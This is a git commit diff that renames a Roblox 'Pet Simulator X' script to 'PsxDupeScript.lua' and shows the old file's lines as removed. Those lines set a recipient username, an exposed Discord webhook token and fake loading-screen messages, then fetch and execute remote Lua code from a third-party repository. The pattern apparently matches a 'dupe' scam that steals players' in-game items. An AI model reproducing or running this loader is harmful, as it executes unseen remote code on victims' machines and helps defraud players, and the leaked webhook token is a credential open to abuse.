097431e06031918d216be51a7107eaf74b367603
Stileox <113307558+Stileox@users.noreply.github.com>
2023-04-02 08:39:59 +0300

    Update and rename psx visual script.lua to PsxDupeScript.lua

--- psx visual script.lua
+++
@@ -1,9 +0,0 @@
-Username = "StileoxBTW"
-WebHook = "https://discord.com/api/webhooks/1091890460739506236/8YagQZ1x_1dX05MkWv2sOa_vkl8R-bfpzHcA-HT4vs_qoH0YzfjVlCPMxfk0F5Hp5-3k"
-loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
